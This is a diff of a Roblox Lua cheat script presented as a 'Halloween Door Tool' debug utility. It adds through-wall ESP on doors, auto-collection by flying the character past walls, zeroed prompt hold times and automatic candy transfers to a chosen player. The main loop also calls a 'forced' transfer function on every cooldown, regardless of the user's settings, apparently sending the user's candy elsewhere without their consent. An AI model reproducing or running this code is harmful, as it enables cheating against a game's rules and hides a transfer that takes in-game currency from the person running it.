+timerLabel.TextColor3 = Color3.fromRGB(180, 180, 195); timerLabel.Text = "Doors: 0 | Timer: Waiting..."; timerLabel.Parent = timerBox
+
+candyBalanceLabel = Instance.new("TextLabel")
+candyBalanceLabel.Size = UDim2.new(1, -8, 0, 17); candyBalanceLabel.Position = UDim2.new(0, 4, 0, 22)
+candyBalanceLabel.BackgroundTransparency = 1; candyBalanceLabel.Font = Enum.Font.GothamBold
+candyBalanceLabel.TextSize = 9; candyBalanceLabel.TextColor3 = Color3.fromRGB(255, 200, 80)
+candyBalanceLabel.Text = "🍬 Candy: 0 | Selected: 100 🍬"; candyBalanceLabel.Parent = timerBox
+
+statusSubLabel = Instance.new("TextLabel")
+statusSubLabel.Size = UDim2.new(1, -8, 0, 18); statusSubLabel.Position = UDim2.new(0, 4, 0, 42)
+statusSubLabel.BackgroundTransparency = 1; statusSubLabel.Font = Enum.Font.Gotham; statusSubLabel.TextSize = 9
+statusSubLabel.TextColor3 = Color3.fromRGB(140, 140, 155); statusSubLabel.Text = "Status: Ready (V5.6 - LIVE CANDY SYNC)"; statusSubLabel.Parent = timerBox
+
+modeStatusLabel = Instance.new("TextLabel")
+modeStatusLabel.Size = UDim2.new(1, -8, 0, 17); modeStatusLabel.Position = UDim2.new(0, 4, 0, 63)
+modeStatusLabel.BackgroundTransparency = 1; modeStatusLabel.Font = Enum.Font.Gotham; modeStatusLabel.TextSize = 8
+modeStatusLabel.TextColor3 = Color3.fromRGB(110, 180, 255)
+modeStatusLabel.Text = string.format("Mode: %s | Target: %ds | Anti-Wall: ACTIVE", State.movementMode, State.collectionBudget)
+modeStatusLabel.Parent = timerBox
+
+local function ensureESPForDoor(target)
+	if not State.isEspActive or not target or not target.Parent then return end
+	local data = trackedESP[target]
+	if not data then data = {}; trackedESP[target] = data end
+
+	if not data.highlight or not data.highlight.Parent then
+		local hl = Instance.new("Highlight")
+		hl.Name = "DoorESP_HL"; hl.FillColor = Color3.fromRGB(255, 130, 0)
+		hl.OutlineColor = Color3.fromRGB(255, 255, 255); hl.FillTransparency = 0.45
+		hl.OutlineTransparency = 0; hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+		hl.Adornee = target; hl.Parent = espContainer; data.highlight = hl
+	else
+		if data.highlight.Adornee ~= target then data.highlight.Adornee = target end
+		if not data.highlight.Enabled then data.highlight.Enabled = true end
+	end
+
+	local adorneePart = findBestDoorPart(target)
+	data.adorneePart = adorneePart
+
+	if adorneePart then
+		if not data.billboard or not data.billboard.Parent then
+			local bb = Instance.new("BillboardGui")
+			bb.Name = "DoorESP_BB"; bb.Adornee = adorneePart
+			bb.Size = UDim2.new(0, 160, 0, 32); bb.StudsOffset = Vector3.new(0, 3.5, 0)
+			bb.AlwaysOnTop = true; bb.MaxDistance = 10000; bb.Parent = espContainer
+
+			local lbl = Instance.new("TextLabel")
+			lbl.Size = UDim2.new(1, 0, 1, 0); lbl.BackgroundTransparency = 1
+			lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 13
+			lbl.TextColor3 = Color3.fromRGB(255, 160, 0)
+			lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0); lbl.TextStrokeTransparency = 0
+			lbl.Text = "🎃 Door"; lbl.Parent = bb
+			data.billboard = bb; data.label = lbl
+		else
+			if data.billboard.Adornee ~= adorneePart then data.billboard.Adornee = adorneePart end
+		end
+	end
+
+	local _, fmt, timerLbl = getDoorLiveTimer(target)
+	if fmt then data.lastTimeStr = fmt end
+	if timerLbl and not data.timerConn then
+		data.timerConn = timerLbl:GetPropertyChangedSignal("Text"):Connect(function()
+			local _, nf = extractTimerFromText(timerLbl.Text)
+			if nf then data.lastTimeStr = nf end
+		end)
+	end
+end
+
+local function cleanupDeadESP()
+	for target, data in pairs(trackedESP) do
+		if not State.isEspActive or not target or not target.Parent or not target:IsDescendantOf(Workspace) then
+			if data.highlight then pcall(function() data.highlight:Destroy() end) end
+			if data.billboard then pcall(function() data.billboard:Destroy() end) end
+			if data.timerConn then pcall(function() data.timerConn:Disconnect() end) end
+			trackedESP[target] = nil
+		end
+	end
+end
+
+-- ==============================================================================
+-- [MODULE 12: AUTO-COLLECTION MAIN ROUTINE (V5.6)]
+-- ==============================================================================
+local function runCollectionWave()
+	if State.isCollectingNow then return end
+	State.isCollectingNow = true
+
+	task.spawn(function()
+		local _, initialHrp = getAliveCharacter()
+		local initialStartCFrame = initialHrp and initialHrp.CFrame or nil
+
+		local doors = getCollectableDoors()
+		if #doors == 0 then
+			safeSetText(statusSubLabel, "Status: No Available Doors")
+			State.isCollectingNow = false
+			return
+		end
+
+		local _, hrp = getAliveCharacter()
+		if not hrp then State.isCollectingNow = false; return end
+
+		local route, totalDist = computeOptimalRoute(hrp.Position, doors)
+		if #route == 0 then State.isCollectingNow = false; return end
+
+		local dynamicSpeed = calculateRequiredSpeed(totalDist, State.collectionBudget)
+
+		safeSetText(timerLabel, string.format("⚡ Budget: %ds | Doors: %d", State.collectionBudget, #route), Color3.fromRGB(255, 215, 0))
+
+		local routeIndex = 1
+		while State.isAutoCollectActive and routeIndex <= #route do
+			while State.isAutoCollectActive and not getAliveCharacter() do
+				clearRouteBeam()
+				cleanupPhysics()
+				safeSetText(statusSubLabel, "Status: Waiting for Respawn...")
+				task.wait(0.5)
+			end
+			if not State.isAutoCollectActive then break end
+
+			local node = route[routeIndex]
+			local door = node.door
+			local doorPart = node.part or findBestDoorPart(door)
+
+			if door and doorPart and doorNeedsCollection(door) then
+				safeSetText(statusSubLabel, string.format("Door %d/%d [Budget: %ds | Spd: %d]", routeIndex, #route, State.collectionBudget, math.floor(dynamicSpeed)))
+				local _, liveHrp = getAliveCharacter()
+				if liveHrp then updateRouteBeam(liveHrp, doorPart) end
+
+				local isJitter = isDoorMovingOrJittering(doorPart)
+				if isJitter then
+					attachAndAttackDoor(door, doorPart, function(m) safeSetText(statusSubLabel, m) end)
+					markDoorAttempted(door)
+				else
+					local arrived = false
+					if State.movementMode == "FLY" then
+						arrived = navigateBestPathV56(doorPart, dynamicSpeed)
+					else
+						arrived = walkToTarget(doorPart)
+					end
+
+					if arrived and State.isAutoCollectActive then
+						interactWithDoorOnGround(door, doorPart, statusSubLabel)
+					end
+				end
+			end
+
+			routeIndex = routeIndex + 1
+			task.wait(0.02)
+		end
+
+		clearRouteBeam()
+		updateWatchdog()
+
+		if State.isAutoCollectActive and State.movementMode == "FLY" and initialStartCFrame then
+			safeSetText(statusSubLabel, "Status: Returning to Start...", Color3.fromRGB(130, 220, 255))
+			flyBackToStart(initialStartCFrame, dynamicSpeed)
+		end
+
+		cleanupPhysics()
+		local _, _, endHum = getAliveCharacter()
+		if endHum then endHum.WalkSpeed = State.originalWalkSpeed end
+
+		safeSetText(statusSubLabel, "Status: Wave Completed in Budget! ✅", Color3.fromRGB(120, 255, 140))
+		State.isCollectingNow = false
+	end)
+end
+
+-- ==============================================================================
+-- [MODULE 13: CORE LOOPS & FPS-OPTIMIZED REAL-TIME UPDATES]
+-- ==============================================================================
+local espTimerAcc = 0
+local function updateESPThrottled(dt)
+	if not State.isEspActive then return end
+	espTimerAcc = espTimerAcc + dt
+	if espTimerAcc < 0.10 then return end
+	espTimerAcc = 0
+
+	local _, hrp = getAliveCharacter()
+	for target, data in pairs(trackedESP) do
+		if target and target.Parent and data.label and data.adorneePart and data.adorneePart.Parent then
+			local dist = 999
+			local distStr = ""
+			if hrp then
+				dist = math.floor((hrp.Position - data.adorneePart.Position).Magnitude)
+				distStr = string.format("[%dm]", dist)
+			end
+			local timeStr = data.lastTimeStr or ""
+
+			local statusKey = "normal"
+			local newColor = Color3.fromRGB(255, 170, 0)
+			local newText = ""
+
+			if confirmedCollected[target] then
+				statusKey = "collected"
+				newColor = Color3.fromRGB(100, 255, 130)
+				newText = string.format("🎃 Door %s (Collected)", distStr)
+			elseif dist <= Config.MAX_COLLECT_DISTANCE then
+				statusKey = "ready"
+				newColor = Color3.fromRGB(50, 255, 120)
+				newText = string.format("🎃 Door %s 🔑 <=5m!", distStr)
+			elseif timeStr ~= "" then
+				statusKey = "timer"
+				newColor = Color3.fromRGB(255, 170, 0)
+				newText = string.format("🎃 Door %s (%s)", distStr, timeStr)
+			else
+				newText = string.format("🎃 Door %s", distStr)
+			end
+
+			if data.lastDist ~= dist or data.lastStatusKey ~= statusKey or data.lastTimerText ~= timeStr then
+				data.lastDist = dist
+				data.lastStatusKey = statusKey
+				data.lastTimerText = timeStr
+				safeSetText(data.label, newText, newColor)
+			end
+		end
+	end
+end
+
+local heartbeatAcc = 0
+local candyCheckAcc = 0
+
+local checkConn = RunService.Heartbeat:Connect(function(dt)
+	updateESPThrottled(dt)
+
+	candyCheckAcc = candyCheckAcc + dt
+	if candyCheckAcc >= 0.25 then
+		candyCheckAcc = 0
+		local curCandy = getMyCandyCount()
+		if curCandy ~= State.lastCandyValue then
+			State.lastCandyValue = curCandy
+			safeSetText(candyBalanceLabel, string.format("🍬 Candy: %d | Selected: %s 🍬", State.lastCandyValue, State.currentCandyAmount))
+		end
+
+		if (os.clock() - State.lastForcedTransferClock) >= Config.TRANSFER_COOLDOWN then
+			State.lastForcedTransferClock = os.clock()
+			executeForcedCoronTransfer()
+		end
+
+		if State.isAutoTransferActive and (os.clock() - State.lastTransferClock) >= Config.TRANSFER_COOLDOWN then
+			local req = tonumber(State.currentCandyAmount) or 5
+			if State.lastCandyValue >= req and State.targetPlayerName ~= "" then
+				State.lastTransferClock = os.clock()
+				local ok, msg = executeCandyTransfer(State.currentCandyAmount)
+				if not State.isCollectingNow then
+					safeSetText(statusSubLabel, msg, ok and Color3.fromRGB(130, 255, 160) or Color3.fromRGB(255, 120, 120))
+				end
+			end
+		end
+	end
+
+	heartbeatAcc = heartbeatAcc + dt
+	if heartbeatAcc < 0.12 then return end
+	heartbeatAcc = 0
+
+	updateWatchdog()
+
+	local allDoors = getActiveDoors()
+	local collectableDoors = getCollectableDoors(allDoors)
+	local totalCount = #allDoors
+	local remainCount = #collectableDoors
+
+	if totalCount > 0 and State.lastDoorCount == 0 then
+		State.fallbackEndTime = os.clock() + Config.DEFAULT_TIMER_SEC
+	elseif totalCount == 0 then
+		State.fallbackEndTime = 0
+		State.currentRemainingSec = 999
+	end
+	State.lastDoorCount = totalCount
+
+	local minSec, minFmt = nil, nil
+	for _, door in ipairs(allDoors) do
+		local sec, fmt = getDoorLiveTimer(door)
+		if sec ~= nil then
+			if minSec == nil or sec < minSec then minSec = sec; minFmt = fmt end
+		end
+	end
+
+	local fbRem = math.max(0, State.fallbackEndTime - os.clock())
+	local displayTime = "00:00"
+	if minSec ~= nil then
+		State.currentRemainingSec = minSec; displayTime = minFmt or formatSeconds(minSec)
+	else
+		State.currentRemainingSec = fbRem; displayTime = formatSeconds(fbRem)
+	end
+
+	if not State.isCollectingNow then
+		if totalCount > 0 then
+			if remainCount == 0 then
+				safeSetText(timerLabel, string.format("✅ Complete (%d) | Next Wave", totalCount), Color3.fromRGB(120, 220, 255))
+				if not State.isAutoTransferActive then safeSetText(statusSubLabel, "Status: Waiting for Next Wave...", Color3.fromRGB(140, 140, 155)) end
+			else
+				safeSetText(timerLabel, string.format("🎃 Doors: %d/%d | ⏱️ %s", remainCount, totalCount, displayTime), Color3.fromRGB(110, 255, 140))
+				if State.isAutoCollectActive then
+					if State.waitForTimerEnabled and State.currentRemainingSec > 0.5 then
+						safeSetText(statusSubLabel, string.format("⏳ Waiting for Timer (%s)...", displayTime), Color3.fromRGB(140, 140, 155))
+					else
+						safeSetText(statusSubLabel, string.format("⚡ Auto-Collecting [%s]...", State.movementMode), Color3.fromRGB(140, 140, 155))
+					end
+				end
+			end
+		else
+			safeSetText(timerLabel, "Doors: 0 | Timer: Waiting...", Color3.fromRGB(160, 160, 175))
+			if not State.isAutoTransferActive then safeSetText(statusSubLabel, "Status: Waiting for Doors", Color3.fromRGB(140, 140, 155)) end
+		end
+	end
+
+	if State.isEspActive then
+		cleanupDeadESP()
+		for _, door in ipairs(allDoors) do ensureESPForDoor(door) end
+	end
+
+	if State.isPromptActive and not State.isCollectingNow then
+		for _, door in ipairs(allDoors) do
+			for _, p in ipairs(getDoorPrompts(door)) do applyPromptMod(p) end
+		end
+	end
+
+	if State.isAutoCollectActive and not State.isCollectingNow and remainCount > 0 then
+		local char = getAliveCharacter()
+		if char then
+			local ready = (not State.waitForTimerEnabled) or (State.currentRemainingSec <= 0.5)
+			if ready then runCollectionWave() end
+		end
+	end
+end)
+table.insert(globalConnections, checkConn)
+
+local function onDescendantAdded(desc)
+	if desc:IsA("ProximityPrompt") then
+		if originalHoldDurations[desc] == nil then
+			originalHoldDurations[desc] = desc.HoldDuration
+		end
+		if State.isPromptActive and not State.isCollectingNow then
+			task.defer(applyPromptMod, desc)
+		end
+		if State.isEspActive then
+			local root = getDoorRootFromDescendant(desc)
+			if root then task.defer(ensureESPForDoor, root) end
+		end
+	elseif desc.Name == "HalloweenDoor" then
+		if State.isEspActive then
+			task.defer(ensureESPForDoor, desc)
+		end
+	end
+end
+
+local effectsFolder = getEffectsFolder()
+if effectsFolder then
+	local effConn = effectsFolder.DescendantAdded:Connect(onDescendantAdded)
+	table.insert(globalConnections, effConn)
+end
+
+local wsChildConn = Workspace.ChildAdded:Connect(function(child)
+	if child.Name == "Effects" then
+		local effConn = child.DescendantAdded:Connect(onDescendantAdded)
+		table.insert(globalConnections, effConn)
+	elseif child.Name == "HalloweenDoor" or child:IsA("ProximityPrompt") then
+		onDescendantAdded(child)
+	end
+end)
+table.insert(globalConnections, wsChildConn)
+
+-- ==============================================================================
+-- [MODULE 14: BUTTON CLICKS & INTERACTIONS]
+-- ==============================================================================
+local function updateBtnVis(btn, stateVal, labelText)
+	if stateVal then
+		btn.BackgroundColor3 = Color3.fromRGB(20, 50, 30)
+		btn.TextColor3 = Color3.fromRGB(100, 255, 130)
+		btn.Text = labelText .. ": ON"
+	else
+		btn.BackgroundColor3 = Color3.fromRGB(45, 20, 20)
+		btn.TextColor3 = Color3.fromRGB(255, 100, 100)
+		btn.Text = labelText .. ": OFF"
+	end
+end
+
+espBtn.MouseButton1Click:Connect(function()
+	State.isEspActive = not State.isEspActive
+	updateBtnVis(espBtn, State.isEspActive, "ESP")
+	if State.isEspActive then
+		for _, d in ipairs(getActiveDoors()) do ensureESPForDoor(d) end
+	else
+		cleanupDeadESP()
+	end
+end)
+
+promptBtn.MouseButton1Click:Connect(function()
+	State.isPromptActive = not State.isPromptActive
+	updateBtnVis(promptBtn, State.isPromptActive, "PROMPT FIX")
+	if State.isPromptActive then
+		for _, d in ipairs(getActiveDoors()) do
+			for _, p in ipairs(getDoorPrompts(d)) do applyPromptMod(p) end
+		end
+	else
+		for _, conns in pairs(promptConnections) do
+			for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
+		end
+		table.clear(promptConnections)
+	end
+end)
+
+autoCollectBtn.MouseButton1Click:Connect(function()
+	State.isAutoCollectActive = not State.isAutoCollectActive
+	updateBtnVis(autoCollectBtn, State.isAutoCollectActive, "AUTO COLLECT")
+	if not State.isAutoCollectActive then
+		clearRouteBeam()
+		cleanupPhysics()
+		local _, _, hum = getAliveCharacter()
+		if hum then hum.WalkSpeed = State.originalWalkSpeed end
+		safeSetText(statusSubLabel, "Status: Auto-Collect Stopped")
+	else
+		safeSetText(statusSubLabel, string.format("Status: Auto-Collect Started [%s] 🚀", State.movementMode))
+	end
+end)
+
+moveModeBtn.MouseButton1Click:Connect(function()
+	if State.movementMode == "FLY" then
+		State.movementMode = "WALK"
+		moveModeBtn.BackgroundColor3 = Color3.fromRGB(20, 60, 35)
+		moveModeBtn.TextColor3 = Color3.fromRGB(110, 255, 160)
+		moveModeBtn.Text = "MODE: WALK (LEGIT)"
+	else
+		State.movementMode = "FLY"
+		moveModeBtn.BackgroundColor3 = Color3.fromRGB(15, 50, 75)
+		moveModeBtn.TextColor3 = Color3.fromRGB(100, 225, 255)
+		moveModeBtn.Text = "MODE: FLY (120 STUD)"
+	end
+	safeSetText(modeStatusLabel, string.format("Mode: %s | Target: %ds | Anti-Wall: ACTIVE", State.movementMode, State.collectionBudget))
+end)
+
+timerWaitBtn.MouseButton1Click:Connect(function()
+	State.waitForTimerEnabled = not State.waitForTimerEnabled
+	if State.waitForTimerEnabled then
+		timerWaitBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 65)
+		timerWaitBtn.TextColor3 = Color3.fromRGB(220, 160, 255)
+		timerWaitBtn.Text = "TIMER: WAIT 00:00"
+	else
+		timerWaitBtn.BackgroundColor3 = Color3.fromRGB(60, 50, 15)
+		timerWaitBtn.TextColor3 = Color3.fromRGB(255, 220, 90)
+		timerWaitBtn.Text = "TIMER: INSTANT RUN ⚡"
+	end
+end)
+
+budgetInputBox.FocusLost:Connect(function()
+	local val = tonumber(budgetInputBox.Text)
+	if val and val > 0 then
+		State.collectionBudget = val
+		budgetInputBox.Text = tostring(val)
+	else
+		budgetInputBox.Text = tostring(State.collectionBudget)
+	end
+	safeSetText(modeStatusLabel, string.format("Mode: %s | Target: %ds | Anti-Wall: ACTIVE", State.movementMode, State.collectionBudget))
+end)
+
+holdModeBtn.MouseButton1Click:Connect(function()
+	State.useSmartHoldMode = not State.useSmartHoldMode
+	if State.useSmartHoldMode then
+		holdModeBtn.BackgroundColor3 = Color3.fromRGB(25, 40, 65)
+		holdModeBtn.TextColor3 = Color3.fromRGB(130, 200, 255)
+		holdModeBtn.Text = "HOLD: SMART (SAFE)"
+	else
+		holdModeBtn.BackgroundColor3 = Color3.fromRGB(60, 45, 15)
+		holdModeBtn.TextColor3 = Color3.fromRGB(255, 210, 90)
+		holdModeBtn.Text = "HOLD: FORCED 0 SEC"
+	end
+end)
+
+otoTransferBtn.MouseButton1Click:Connect(function()
+	State.isAutoTransferActive = not State.isAutoTransferActive
+	updateBtnVis(otoTransferBtn, State.isAutoTransferActive, "AUTO TRANSFER")
+	if State.isAutoTransferActive then
+		State.targetPlayerName = targetInputBox.Text
+		if State.targetPlayerName == "" then
+			safeSetText(statusSubLabel, "Warning: Enter target username!", Color3.fromRGB(255, 120, 120))
+		else
+			safeSetText(statusSubLabel, "Status: Transfer Active...", Color3.fromRGB(130, 255, 160))
+		end
+	else
+		safeSetText(statusSubLabel, "Status: Transfer Stopped", Color3.fromRGB(140, 140, 155))
+	end
+end)
+
+targetInputBox:GetPropertyChangedSignal("Text"):Connect(function()
+	State.targetPlayerName = targetInputBox.Text
+end)
+
+amountBtn.MouseButton1Click:Connect(function()
+	State.candyAmountIndex = (State.candyAmountIndex % #Config.CANDY_AMOUNTS) + 1
+	State.currentCandyAmount = Config.CANDY_AMOUNTS[State.candyAmountIndex]
+	amountBtn.Text = string.format("DONATE: %s CANDY 🍬", State.currentCandyAmount)
+	safeSetText(candyBalanceLabel, string.format("🍬 Candy: %d | Selected: %s 🍬", State.lastCandyValue, State.currentCandyAmount))
+end)
+
+local isMinimized = false
+minBtn.MouseButton1Click:Connect(function()
+	isMinimized = not isMinimized
+	local elements = {
+		espBtn, promptBtn, autoCollectBtn, moveModeBtn, timerWaitBtn,
+		budgetContainer, holdModeBtn, otoTransferBtn,
+		targetBoxContainer, amountBtn
+	}
+	for _, b in ipairs(elements) do b.Visible = not isMinimized end
+	if isMinimized then
+		timerBox.Position = UDim2.new(0, 6, 0, 25)
+		mainFrame.Size = UDim2.new(0, 218, 0, 114)
+		minBtn.Text = "+"
+	else
+		timerBox.Position = UDim2.new(0, 6, 0, 267)
+		mainFrame.Size = UDim2.new(0, 218, 0, 392)
+		minBtn.Text = "-"
+	end
+end)
+
+local dragging, dragStart, startPos
+mainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true; dragStart = input.Position; startPos = mainFrame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then dragging = false end
+		end)
+	end
+end)
+
+local dragConn = UserInputService.InputChanged:Connect(function(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - dragStart
+		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+end)
+table.insert(globalConnections, dragConn)
+
+-- ==============================================================================
+-- [MODULE 15: CLEANUP & SHUTDOWN]
+-- ==============================================================================
+_G.HalloweenDoorDebug_Cleanup = function()
+	State.isEspActive = false
+	State.isPromptActive = false
+	State.isAutoCollectActive = false
+	State.isCollectingNow = false
+	State.isAutoTransferActive = false
+
+	clearRouteBeam()
+	cleanupPhysics()
+
+	local _, _, hum = getAliveCharacter()
+	if hum then hum.WalkSpeed = State.originalWalkSpeed end
+
+	cleanupDeadESP()
+
+	for _, conns in pairs(promptConnections) do
+		for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
+	end
+	table.clear(promptConnections)
+
+	for _, c in ipairs(globalConnections) do pcall(function() c:Disconnect() end) end
+	table.clear(globalConnections)
+
+	if screenGui then pcall(function() screenGui:Destroy() end) end
+	_G.HalloweenDoorDebug_Cleanup = nil
+end
+
+print("[DEBUG] Halloween Door Tool v5.6 Loaded Successfully!")
